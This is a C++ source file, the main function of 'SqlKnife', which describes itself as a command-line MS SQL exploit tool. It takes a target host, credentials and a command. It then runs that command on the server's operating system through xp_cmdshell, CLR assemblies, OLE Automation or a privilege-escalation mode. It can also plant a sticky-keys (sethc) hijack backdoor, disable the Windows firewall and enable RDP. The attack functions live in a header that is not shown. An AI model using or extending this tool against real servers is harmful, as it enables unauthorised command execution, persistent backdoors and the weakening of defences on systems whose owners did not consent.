// SqlKnife.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include "MsSqlExploit.h"
#include "getopt.h"

//using namespace std;

int main(int argc, char** argv) {

	if (argc == 1)
	{
		cout << "SqlKnife v1.0 "<<endl << "a mssql exploit tool in commandline." << endl;
		cout << argv[0] << "<-H host> <-P port> <-u username> <-p password> <-D dbname> <-c cmd> <--openrdp> <--shift> <--disfw> <--oacreate> <--clrcmd> <--clrdexec> <--xpcmd> <--dbup> <--fix> <--remove>" << endl;
		return 0;
	}

	ExecMethod method = ExecMethod::NONE;
	string cmd;
	string host = "127.0.0.1";
	string user = "sa";
	string pass = "";
	string port = "1433";
	string dbname = "master";
	//string asmarg = "";
	bool iffix = false;
	bool shift = false;
	bool openrdp = false;
	bool disfw = false;
	bool remove = false;

	static struct option long_option[] = {

		//{"host",required_argument,NULL,'H'},
		//{"user",required_argument,NULL,'u'},
		//{"pass",required_argument,NULL,'p'},
		//{"port",required_argument,NULL,'P'},
		//{"db",required_argument,NULL,'D'},
		{"openrdp",no_argument,NULL,0},
		{"shift",no_argument,NULL,1},
		{"disfw",no_argument,NULL,2},
		{"xpcmd",no_argument,NULL,3},
		{"clrcmd",no_argument,NULL,4},
		{"oacreate",no_argument,NULL,5},
		{"clrdexec",no_argument,NULL,6},
		{"fix",no_argument,NULL,7},
		{"dbup",no_argument,NULL,8},
		//{"exeasm",no_argument,NULL,9},
		{"remove",no_argument,NULL,10},
		//{"cmd",required_argument,NULL,'c'},
		//{"puser",required_argument,NULL,'s'},
		//{"ppass",required_argument,NULL,'a'},
		{0,0,0,0}

	};

	int opt;
	//while ((opt=getopt_long_only(argc,argv,"H:u:p:P:D:c:s:a:",long_option,NULL))!=-1)
	while ((opt = getopt_long_only(argc, argv, "H:u:p:P:D:c:", long_option, NULL)) != -1)
	{
		if (opt == -1)
		{
			cout << argv[0] << " help msg." << endl;
			break;
		}
		switch (opt)
		{
		case 0:
			openrdp = true;
			continue;
		case 1:
			shift = true;
			continue;
		case 2:
			disfw = true;
			continue;
		case 3:
			method = ExecMethod::XPCMD;
			continue;
		case 4:
			method = ExecMethod::CLRCMD;
			continue;
		case 5:
			method = ExecMethod::OACREATE;
			continue;
		case 6:
			method = ExecMethod::CLRDEXEC;
			continue;
		case 7:
			iffix = true;
			continue;
		case 8:
			method = ExecMethod::DBUP;
			continue;
			//case 9:
			//	method = ExecMethod::EXEASM;
			//	continue;
		case 10:
			remove = true;
			continue;
		case 'H':
			host = optarg;
			continue;
		case 'u':
			user = optarg;
			continue;
		case 'p':
			pass = optarg;
			continue;
		case 'P':
			port = optarg;
			continue;
		case 'c':
			cmd = optarg;
			continue;
		case 'D':
			dbname = optarg;
			continue;
			//case 's':

			//	continue;
			//case 'a':
				//exeasm时的参数
				//asmarg = optarg;
				//continue;
		default:
			break;
		}
	}

	MsSqlExploit* msexp = new MsSqlExploit();
	msexp->builddsn(host, port, dbname);
	msexp->connect(user, pass);

	if (shift)
	{
		msexp->sethchijack();
		return 0;
	}
	if (disfw)
	{
		msexp->disfirewall();
		return 0;
	}
	if (openrdp)
	{
		msexp->openrdp();
	}
	if (iffix)
	{
		msexp->dofix(method);
		return 0;
	}
	if (remove)
	{
		msexp->remove(method);
		return 0;
	}

	if (method != ExecMethod::NONE)
	{
		msexp->execcmd(cmd, method);
		return 0;
	}

}